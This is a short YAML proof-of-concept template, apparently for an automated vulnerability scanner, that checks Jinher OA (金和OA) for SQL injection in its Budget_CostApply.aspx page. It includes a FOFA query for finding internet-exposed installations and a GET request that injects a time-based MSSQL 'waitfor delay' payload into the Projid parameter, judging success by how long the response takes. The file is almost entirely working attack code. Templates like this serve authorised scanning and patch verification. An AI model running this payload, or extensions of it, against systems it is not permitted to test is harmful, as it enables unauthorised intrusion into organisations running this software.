id: poc-yaml-jinher-jhsoft-budget-costapply-aspx-sqli
info:
  name: 金和OA Budget_CostApply.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /c6/JHSoft.Web.CostControl/BudgetExecution/Budget_CostApply.aspx/?Projid=1'waitfor+delay%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    body == "" &&

    contains(headers,"Cookie:") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
